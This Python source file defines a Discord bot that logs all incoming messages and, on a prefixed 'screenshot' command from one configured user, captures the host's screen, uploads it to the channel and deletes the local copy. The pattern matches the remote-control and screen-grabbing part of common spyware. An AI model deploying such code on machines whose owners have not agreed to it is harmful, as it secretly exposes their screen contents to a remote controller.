from .Utils import screenshot, fileHandler
import discord
from .config import config


class Bot(discord.Client):
    async def on_ready(self):
        print('bot started has', self.user)

    async def on_message(self, message):
        print(f'{message.author.id} : {message.content}')
        if message.author.id != config['master_id'] or not message.content.startswith(config['prefix']):
            return

        command = message.content[len(config['prefix']):]

        if command == 'screenshot':
            workingMsg = await message.channel.send("Executing...")
            fileName = screenshot.takeScreenshot()
            with open(fileName, 'br') as f:
                await message.channel.send(file=discord.File(f, fileName))
            fileHandler.deleteFile(fileName)
            await workingMsg.delete()
